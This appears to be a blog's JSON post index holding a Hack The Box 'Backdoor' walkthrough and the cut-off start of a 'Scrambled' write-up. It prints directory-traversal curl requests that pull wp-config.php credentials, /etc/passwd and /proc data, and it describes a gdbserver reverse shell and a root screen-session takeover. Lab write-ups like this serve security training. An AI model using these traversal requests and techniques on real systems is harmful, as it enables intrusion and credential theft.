[ { "title": "Backdoor Write-up", "url": "/posts/backdoor/", "categories": "Hack The Box, Linux", "tags": "wordpress, lfi, gdbserver, screen", "date": "2022-10-12 09:00:00 +0200", "snippet": "EnumerationOS DetectionIn order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the TTL (Time To Live) of a ping response can give us clues. TTL will be close to 64 on Unix machines, close to 128 on Windows machines, and close to 255 on Solaris machines.Ping target machineWe can see that the machine that we are targeting has a TTL of 63, so we guess that we are dealing with a Unix machine.NmapFirst, we will start enumerating the open ports on the victim machine with nmap. We will specify that we want to scan all the port range, that we only want to display the open ports and that we will use the TCP Syn Port Scan scanning method. Additionally, we will specify explicitly that we don’t want to perform host discovery and DNS resolution. This will speed up the process. Lastly, we will export all the evidence to a file called allPorts.txt:nmap -p- -sS --min-rate 5000 -n -Pn -oG allPorts.txt 10.10.11.125# Nmap 7.92 scan initiated Mon Oct 10 09:15:55 2022 as: nmap -p- -sS --min-rate 5000 -n -Pn -oG allPorts.txt 10.10.11.125Host: 10.10.11.125 ()\tStatus: UpHost: 10.10.11.125 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///, 1337/open/tcp//waste///\tIgnored State: closed (65532)# Nmap done at Mon Oct 10 09:16:08 2022 -- 1 IP address (1 host up) scanned in 13.01 secondsOnce we know the open ports, we will scan them in a more exhaustive way to find the services and versions that are running. We will export evidence to the targeted.txt file:nmap -p22,80,1337 -sCV -n -Pn -oN targeted.txt 10.10.11.125# Nmap 7.92 scan initiated Mon Oct 10 09:16:47 2022 as: nmap -p22,80,1337 -sCV -n -Pn -oN targeted.txt 10.10.11.125Nmap scan report for 10.10.11.125Host is up (0.035s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;#8211; Real-Life|_http-generator: WordPress 5.8.11337/tcp open waste?Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Oct 10 09:17:09 2022 -- 1 IP address (1 host up) scanned in 21.95 secondsThe target machine has the 22 (SSH), 80 (HTTP) and 1337 (Unknown) ports open.As the SSH service is running a pretty new version of OpenSSH and we can’t identify the service running on port 1337, we will start enumerating the web server on port 80.We will do a simple scan of the web server using an integrated Nmap script named http-enum that is part of the NSE Engine. This script will try the most common files and directories on the web servers, and if they exist, it will report them. We will save the evidence to a file called webScan.txt:nmap --script http-enum -p80 -oN webScan.txt 10.10.11.125# Nmap 7.92 scan initiated Mon Oct 10 09:26:04 2022 as: nmap --script http-enum -p80 -oN webScan.txt 10.10.11.125Nmap scan report for 10.10.11.125Host is up (0.035s latency).PORT STATE SERVICE80/tcp open http| http-enum: | /wp-login.php: Possible admin folder| /readme.html: Wordpress version: 2 | /: WordPress version: 5.8.1| /wp-includes/images/rss.png: Wordpress version 2.2 found.| /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.| /wp-includes/images/blank.gif: Wordpress version 2.6 found.| /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.| /wp-login.php: Wordpress login page.| /wp-admin/upgrade.php: Wordpress login page.|_ /readme.html: Interesting, a readme.# Nmap done at Mon Oct 10 09:26:13 2022 -- 1 IP address (1 host up) scanned in 8.44 secondsWe can see that there are some interesting directories on the web server, and judging by the structure, we can say that we are dealing with a Wordpress web server.FuzzingIf we know the structure that the Wordpress CMS (Content Management System) usually has, we know that it contains a folder named wp-content. This folder is usually used to host the content of the web server, including user-uploaded data. We use wfuzz to fuzz its directories:Target: http://10.10.11.125/wp-content/FUZZTotal requests: 220560==================================================================ID Response Lines Word Chars Request ==================================================================00001: C=200 0 L\t 0 W\t 0 Ch\t \"# directory-list-2.3-medium.txt\"00006: C=200 0 L\t 0 W\t 0 Ch\t \"# Attribution-Share Alike 3.0 License. To view a copy of this\"00003: C=200 0 L\t 0 W\t 0 Ch\t \"# Copyright 2007 James Fisher\"00005: C=200 0 L\t 0 W\t 0 Ch\t \"# This work is licensed under the Creative Commons\"00002: C=200 0 L\t 0 W\t 0 Ch\t \"#\"00004: C=200 0 L\t 0 W\t 0 Ch\t \"#\"00007: C=200 0 L\t 0 W\t 0 Ch\t \"# license, visit http://creativecommons.org/licenses/by-sa/3.0/\"00009: C=200 0 L\t 0 W\t 0 Ch\t \"# Suite 300, San Francisco, California, 94105, USA.\"00013: C=200 0 L\t 0 W\t 0 Ch\t \"#\"00011: C=200 0 L\t 0 W\t 0 Ch\t \"# Priority ordered case-sensitive list, where entries were found\"00012: C=200 0 L\t 0 W\t 0 Ch\t \"# on at least 2 different hosts\"00008: C=200 0 L\t 0 W\t 0 Ch\t \"# or send a letter to Creative Commons, 171 Second Street,\"00010: C=200 0 L\t 0 W\t 0 Ch\t \"#\"00014: C=200 0 L\t 0 W\t 0 Ch\t \"http://10.10.11.125/wp-content/\"00127: C=301 9 L\t 28 W\t 324 Ch\t \"themes\"00164: C=301 9 L\t 28 W\t 325 Ch\t \"uploads\"00519: C=301 9 L\t 28 W\t 325 Ch\t \"plugins\"01031: C=301 9 L\t 28 W\t 325 Ch\t \"upgrade\"45240: C=200 0 L\t 0 W\t 0 Ch\t \"http://10.10.11.125/wp-content/\"Total time: 0Processed Requests: 220560Filtered Requests: 220541Requests/sec.: 0We can see some interesting folders as uploads and plugins. The first one is usually where user-uploaded data is hosted, and the second one corresponds to the Wordpress plugins that are being used. This last one is critical to examine as plugins often contain vulnerabilities and are not updated as often as the CMS.Target: http://10.10.11.125/FUZZTotal requests: 13368==================================================================ID Response Lines Word Chars Request ==================================================================00468: C=403 9 L\t 28 W\t 277 Ch\t \"wp-content/plugins/akismet/\"04592: C=500 0 L\t 0 W\t 0 Ch\t \"wp-content/plugins/hello.php\"04593: C=500 0 L\t 0 W\t 0 Ch\t \"wp-content/plugins/hello.php/\"Total time: 0Processed Requests: 13368Filtered Requests: 13365Requests/sec.: 0We will find the akismet and the hello.php plugins. This plugins don’t seem to have any vulnerability, so we will proceed to examine the CMS further.WordpressWpscanWe don’t have a defined access point, so we will enumerate further the web server. We are dealing with a Wordpress web server, so we can use the wpscan tool to enumerate it.We will start by performing aggressive plugin detection. This will allow us to discover if there are more plugins than the ones that we have found doing fuzzing:wpscan -e ap --plugins-detection aggressive --url http://10.10.11.125WpScan pluginsWe can see how there is a plugin called ebook-download that we haven’t discovered in the fuzzing phase. Additionally, wpscan reveals to us that the version that is being used is 1.1.Directory TraversalWe will search for exploits in the ebook-download plugin with searchsploit:SearchsploitThere is a Directory Traversal vulnerability in the 1.1 version of ebook-download, the version that we have just discovered the web server is using. We will inspect this exploit further:# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal# Exploit Author: Wçadeek# Website Author: https://github.com/Wad-Deek# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip# Version: 1.1# Tested on: Xampp on Windows7[Version Disclosure]======================================http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt======================================[PoC]======================================/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php======================================We can see that this exploit is a .txt file explaining how the Directory Traversal vulnerability can be used. Basically, there is a file called filedownload.php in the ebook-download plugin, that has an ebookdownloadurl parameter that can be pointed to internal resources using Directory Traversal.First, we can try to download the wp-config.php file of the web server, as it usually contains credentials in plain text or at least useful information. If we notice, we have to go back three directories to be at the root of the web server. This is where the wp-config.php file is located. We will curl the mentioned endpoint in order to try to download the file:curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php../../../wp-config.php../../../wp-config.php../../../wp-config.php&lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the installation. * You don't have to use the web site, you can copy this file to \"wp-config.php\" * and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( 'DB_NAME', 'wordpress' );/** MySQL database username */define( 'DB_USER', 'wordpressuser' );/** MySQL database password */define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );/** MySQL hostname */define( 'DB_HOST', 'localhost' );/** Database charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8' );/** The database collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );/**#@+ * Authentication unique keys and salts. * * Change these to different unique phrases! You can generate these using * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}. * * You can change these at any point in time to invalidate all existing cookies. * This will force all users to have to log in again. * * @since 2.6.0 *//* That's all, stop editing! Happy blogging. *//** Absolute path to the WordPress directory. */if ( !defined('ABSPATH') )define('ABSPATH', dirname(__FILE__) . '/');/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */$currenthost = \"http://\".$_SERVER['HTTP_HOST'];$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));$currentpath = preg_replace('/\\/wp.+/','',$currentpath);define('WP_HOME',$currenthost.$currentpath);define('WP_SITEURL',$currenthost.$currentpath);define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content');define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins');define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath );@define('ADMIN_COOKIE_PATH', './');define( 'AUTH_KEY', 'put your unique phrase here' );define( 'SECURE_AUTH_KEY', 'put your unique phrase here' );define( 'LOGGED_IN_KEY', 'put your unique phrase here' );define( 'NONCE_KEY', 'put your unique phrase here' );define( 'AUTH_SALT', 'put your unique phrase here' );define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );define( 'LOGGED_IN_SALT', 'put your unique phrase here' );define( 'NONCE_SALT', 'put your unique phrase here' );/**#@-*//** * WordPress database table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */$table_prefix = 'wp_';/** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the documentation. * * @link https://wordpress.org/support/article/debugging-in-wordpress/ */define( 'WP_DEBUG', false );/* Add any custom values between this line and the \"stop editing\" line. *//* That's all, stop editing! Happy publishing. *//** Absolute path to the WordPress directory. */if ( ! defined( 'ABSPATH' ) ) {\tdefine( 'ABSPATH', __DIR__ . '/' );}/** Sets up WordPress vars and included files. */require_once ABSPATH . 'wp-settings.php';&lt;script&gt;window.close()&lt;/script&gt;We can see that the wp-config.php file is being displayed and that we have some credentials, presumably for the database, on the target machine:Wordpress -&gt; wordpressuser -&gt; MQYBJSaD#DxG6qbmNow, we will go back a few more directories and we will try to download the /etc/passwd file:curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinuser:x:1000:1000:user:/home/user:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false&lt;script&gt;window.close()&lt;/script&gt;This file is always useful for learning about the users on the target machine. In this case, we have a user called user that has a /bin/bash shell assigned.If we remember the enumeration phase, the SSH service was enabled, but if we try to read the /home/user/.ssh/id_rsa file, we will notice that it is not being displayed.We will have to enumerate further in order to gain a shell on the target machine. We will start by enumerating the processes running on the target machine. To do that, we can list the /proc/sched_debug file. This file contains all the names of processes running on the target machine and their associated PIDs (Program IDs). We will retrieve this file:curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/sched_debugrunnable tasks: S task PID tree-key switches prio wait-time sum-exec sum-sleep----------------------------------------------------------------------------------------------------------- Ssystemd-resolve 681 396.619020 919 120 0.000000 535.509599 0.000000 0 0 /autogroup-30 Ssystemd-timesyn 683 345.419420 318 120 0.000000 364.071150 0.000000 0 0 /autogroup-31 S sd-resolve 751 351.353787 853 120 0.000000 102.344524 0.000000 0 0 /autogroup-31 S HangDetector 752 1953.279714 2281 120 0.000000 85.176872 0.000000 0 0 /autogroup-36 Saccounts-daemon 754 26.168089 72 120 0.000000 14.543910 0.000000 0 0 /autogroup-38 S gmain 761 52.585943 2043 120 0.000000 121.948100 0.000000 0 0 /autogroup-38 S gdbus 894 26.808460 35 120 0.000000 2.709312 0.000000 0 0 /autogroup-38 S rsyslogd 776 36.284934 33 120 0.000000 6.967121 0.000000 0 0 /autogroup-43 S in:imklog 805 9.185210 4 120 0.000000 3.432806 0.000000 0 0 /autogroup-43 S rs:main Q:Reg 806 47.756009 1119 120 0.000000 56.144683 0.000000 0 0 /autogroup-43 S cron 831 0.691187 31 120 0.000000 2.891720 0.000000 0 0 /autogroup-55 S cron 832 0.666570 26 120 0.000000 3.109721 0.000000 0 0 /autogroup-55 S sh 844 14166.949705 4303 120 0.000000 817.101098 0.000000 0 0 /autogroup-57 S sh 847 1.586230 3 120 0.000000 1.204028 0.000000 0 0 /autogroup-64 S atd 856 1.340863 5 120 0.000000 2.882284 0.000000 0 0 /autogroup-63 S (sd-pam) 961 0.464843 1 120 0.000000 0.251041 0.000000 0 0 /autogroup-76 S screen 966 0.466555 11 120 0.000000 1.324943 0.000000 0 0 /autogroup-78 S bash 972 41.421383 130 120 0.000000 28.242470 0.000000 0 0 /autogroup-79 S ib_io_rd-1 1019 1754.497361 4265 120 0.000000 114.641141 0.000000 0 0 /autogroup-80 S ib_io_wr-2 1024 1754.530925 4356 120 0.000000 116.785899 0.000000 0 0 /autogroup-80 S ib_io_wr-4 1026 1754.550461 4326 120 0.000000 119.141381 0.000000 0 0 /autogroup-80 S ib_pg_flush_co 1027 1754.487262 2312 120 0.000000 141.575541 0.000000 0 0 /autogroup-80 S ib_log_flush 1030 1760.530098 22226 120 0.000000 698.770218 0.000000 0 0 /autogroup-80 Sib_log_wr_notif 1031 1760.527739 21947 120 0.000000 693.114159 0.000000 0 0 /autogroup-80 S ib_log_writer 1032 1760.561132 22072 120 0.000000 744.339427 0.000000 0 0 /autogroup-80 S xpl_worker-1 1044 1748.809084 37 120 0.000000 1.784572 0.000000 0 0 /autogroup-80 S xpl_worker-2 1045 1748.747528 36 120 0.000000 0.498846 0.000000 0 0 /autogroup-80 S ib_buf_dump 1050 948.473208 6 120 0.000000 0.870655 0.000000 0 0 /autogroup-80 S ib_srv_purge 1052 1363.639160 1419 120 0.000000 49.311427 0.000000 0 0 /autogroup-80 S ib_srv_wkr-1 1053 1362.762495 512 120 0.000000 16.171621 0.000000 0 0 /autogroup-80 S ib_srv_wkr-2 1054 1362.761183 588 120 0.000000 7.164060 0.000000 0 0 /autogroup-80 S sig_handler 1057 974.946940 2 120 0.000000 0.144871 0.000000 0 0 /autogroup-80 S connection 1358 1319.789789 310 120 0.000000 49.962620 0.000000 0 0 /autogroup-80&gt;R apache2 989 5768.821922 8890 120 0.000000 2226.710891 0.000000 0 0 /autogroup-68 S apache2 2135 5767.434831 6832 120 0.000000 1699.605290 0.000000 0 0 /autogroup-68 S apache2 2146 5773.990634 6842 120 0.000000 1719.259974 0.000000 0 0 /autogroup-68 S apache2 2150 5771.905152 7015 120 0.000000 1733.139759 0.000000 0 0 /autogroup-68 I kworker/u256:1 3282 25660.399175 3482 120 0.000000 122.960262 0.000000 0 0 / I kworker/1:0 3304 25103.186574 7079 120 0.000000 597.353019 0.000000 0 0 / S su 3415 16.258561 29 120 0.000000 5.854285 0.000000 0 0 /autogroup-64 S gdbserver 3424 10.631109 13 120 0.000000 3.848920 0.000000 0 0 /autogroup-94 I kworker/1:1 4867 25664.124835 4644 120 0.000000 404.925768 0.000000 0 0 /&lt;script&gt;window.close()&lt;/script&gt;If we examine the process names, one of them will attract our attention. This process is gdbserver, usually used to debug applications on a machine from another machine. We can also see that the associated PID for this process is 3424.Once we know the PID of the process that we want to examine, we can retrieve the /proc/{PID}/cmdline file to see the expression that is being used to invoke the process. We can retrieve this file with the following command:curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/3424/cmdline &gt; cmdlineThis file will be binary, so we will extract the strings contained in the binary into a text file:strings cmdline &gt; proc-3424-cmdline.txt../../../../../../../../proc/3424/cmdline../../../../../../../../proc/3424/cmdline../../../../../../../../proc/3424/cmdlinegdbserver--once0.0.0.0:1337/bin/true&lt;script&gt;window.close()&lt;/script&gt;This file gives us useful information, as we have discovered that the gdbserver process is running on port 1337. This port was the one that Nmap was not capable of identifying.User ShellGDB ServerOnce we know the process running on port 1337 is gdbserver, we can try to exploit it in order to gain a user shell.First, we will create a payload with msfvenom. This payload will be a shell_reverse_tcp and it will be in elf format. Additionally, we have indicated that we want the reverse shell to be created as a new process with fork. This will be useful to keep the gdbserver process running and not stuck after sending our reverse shell:Reverse Shell ElfOnce we have created the payload, we will upload it to the target machine via gdbserver. To do this, we will use the following commands:Upload Elf to Target MachineWe can see how the payload is now on the target machine. Finally, we will try to execute this payload with the following commands:Exec Elf in Target MachineWe will receive a shell in the port that we are listening. The problem is that this shell is not interactive, so we will do a treatment to make it a fully interactive terminal:TTY TreatmentWe have a shell as the user user, so we will proceed to visualize the user.txt flag in the /home/user/ directory.Root ShellMySQLIf we remember the previous phase, we found some credentials for the database used by Wordpress. We will try to connect to the database to see if we can retrieve any useful information. If we list the tables in the Wordpress database:Database TablesThere is a table called wp_users that will attract our attention. We will visualize the content of it:Credentials in Users TableWe will find the following hash in the database, that corresponds to the admin user:$P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5.If we try to crack this hash either using offline cracking or a website like crackstation, we will see that there are no coincidences, so we will keep enumerating the target machine in order to escalate privileges.GNU ScreenIf we examine the processes that are running on the target machine, we will see two processes that will attract our attention. The first one will be a session of GNU Screen running as the root user:Screen Session as RootThe second process will be a script that does the following:/bin/sh -c while true; do sleep1;find /var/run/screen/S-root/ -empty -exec screen -dmS root; doneWe can see that this script is a recurring task that finds sessions in the /var/run/screen/S-root/ directory, and if there are not any sessions created, it creates a session as the root user.If we list the sessions running as root with the screen -ls root/ command, we will find that there is a created session. We can also see that this session is configured to be used as multiuser. This allows us to attach to the session even if we are not the root user:Synchronize to SessionWe have a shell as the root user, so we will proceed to visualize the root.txt flag in the /root/ directory." }, { "title": "Scrambled Write-up", "url": "/posts/scrambled/", "categories": "Hack The Box, Windows", "tags": "htb, windows, kerberos, silverticket, mssql, deserialization", "date": "2022-10-05 09:00:00 +0200", "snippet": "EnumerationOS DetectionIn order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the TTL (Time To Live) of a ping response can give us clues. TTL will be close to 64 on Unix machines, close to 128 on Windows machines, and close to 255 on Solaris machines.ping target machineWe can see that the machine that we are targeting has a TTL of 127, so we guess that we are dealing with a Windows machine.NmapFirst, we will start enumerating the open ports on the victim machine. To do that, we will use nmap. We will specify that we want to scan all the port range, that we only want to display the open ports and that we will use the TCP Syn Port Scan scanning method. Optionally, we will specify explicitly that we don’t want to perform host discovery and DNS resolution. This will speed up the process. Lastly, we will export all the evidence to a file called allPorts.txt:nmap -p- -sS --min-rate 5000 -n -Pn -oG allPorts.txt 10.10.11.168# Nmap 7.92 scan initiated Thu Sep 22 13:56:32 2022 as: nmap -p- -sS --min-rate 5000 -n -Pn -oG allPorts.txt 10.10.11.168Host: 10.10.11.168 ()\tStatus: UpHost: 10.10.11.168 ()\tPorts: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 1433/open/tcp//ms-sql-s///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 4411/open/tcp//found///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49696/open/tcp/////, 49700/open/tcp/////, 58506/open/tcp/////\tIgnored State: filtered (65513)# Nmap done at Thu Sep 22 13:57:12 2022 -- 1 IP address (1 host up) scanned in 39.63 secondsOnce we know the open ports, we will scan them in a more exhaustive way to find the services and versions that are running. We will export evidence to the targeted.txt file:nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49696,49700,58506 -sCV -oN targeted.txt 10.10.11.168# Nmap 7.92 scan initiated Thu Sep 22 13:58:00 2022 as: nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49696,49700,58506 -sCV -oN targeted.txt 10.10.11.168Nmap scan report for 10.10.11.168Host is up (0.11s latency).PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: Scramble Corp Intranet|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-09-22 11:58:04Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:57445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:571433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2022-09-22T04:15:16|_Not valid after: 2052-09-22T04:15:16|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:573269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:57|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.4411/tcp open found?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: | SCRAMBLECORP_ORDERS_V1.0.3;| FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: | SCRAMBLECORP_ORDERS_V1.0.3;|_ ERROR_UNKNOWN_COMMAND;5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049674/tcp open msrpc Microsoft Windows RPC49696/tcp open msrpc Microsoft Windows RPC49700/tcp open msrpc Microsoft Windows RPC58506/tcp open msrpc Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port4411-TCP:V=7.92%I=7%D=9/22%Time=632C4DCE%P=aarch64-unknown-linux-gnSF:u%r(NULL,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(GenericLines,1D,\"SCRSF:AMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(GetRequest,35,\"SCRAMBLECORP_ORDERS_VSF:1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\")%r(HTTPOptions,35,\"SCRAMBLECORPSF:_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\")%r(RTSPRequest,35,\"SCRSF:AMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\")%r(RPCCheck,1SF:D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(DNSVersionBindReqTCP,1D,\"SCRAMSF:BLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(DNSStatusRequestTCP,1D,\"SCRAMBLECORP_OSF:RDERS_V1\\.0\\.3;\\r\\n\")%r(Help,35,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERRORSF:_UNKNOWN_COMMAND;\\r\\n\")%r(SSLSessionReq,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.SF:3;\\r\\n\")%r(TerminalServerCookie,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")SF:%r(TLSSessionReq,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(Kerberos,1D,SF:\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(SMBProgNeg,1D,\"SCRAMBLECORP_ORDESF:RS_V1\\.0\\.3;\\r\\n\")%r(X11Probe,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%rSF:(FourOhFourRequest,35,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_CSF:OMMAND;\\r\\n\")%r(LPDString,35,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNSF:KNOWN_COMMAND;\\r\\n\")%r(LDAPSearchReq,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\SF:r\\n\")%r(LDAPBindReq,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(SIPOptionSF:s,35,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\")%r(LSF:ANDe